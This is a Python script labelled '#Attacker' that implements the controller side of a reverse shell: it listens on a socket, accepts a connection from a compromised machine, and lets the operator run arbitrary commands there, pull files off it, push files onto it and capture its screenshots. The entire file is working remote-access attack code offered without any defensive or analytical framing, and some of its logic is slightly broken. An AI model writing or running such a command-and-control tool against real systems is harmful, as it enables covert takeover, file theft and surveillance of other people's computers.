#Attacker
#from datetime import datetime as dt
import json
import socket
import base64
count=1
def server():
    global s,target,ip
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("127.0.0.1",54321))
    s.listen(5)
    print("Listening")
    target,ip=s.accept()
    print(f"Connected to {ip}")
    shell()
    
def shell():
    global count
    while True:
        cmd=input(f"{ip} cmd :")
        reliable_send(cmd.encode())
        if cmd =="iquit":
            break
        elif cmd[:2]=="cd" and len(cmd)>1:
            continue
        elif cmd[:8]=="download":
            with open(cmd[9:],"wb") as file:
                result=reliable_recv()
                file.write(base64.b64decode(result))
        elif cmd[:6]=="upload":
            try:
                with open(cmd[7:],"rb") as fin:
                    reliable_send(base64.b64encode(fin.read()))
            except:
                failed="Cannot upload!"
                reliable_send(base64.b64encode(failed.encode()))
        elif cmd=="screenshot":
    
            with open("screenshot%d.png" % count,"wb") as screen:
                image=reliable_recv()
                image_decode=base64.b64decode(image)
                if image_decode[:3]=="[!]":
                        print(image_decode)
                else:
                        screen.write(image_decode)
                        count+=1
        else:
            result=reliable_recv()
            print(result)
    
def reliable_send(data):
    json_data=json.dumps(data.decode())
    target.send(json_data.encode())
    
    
def reliable_recv():
    json_data=""
    while True:
        try:
            json_data+=target.recv(1024).decode()
            return json.loads(json_data)
        except:
            continue
        
server()
s.close() 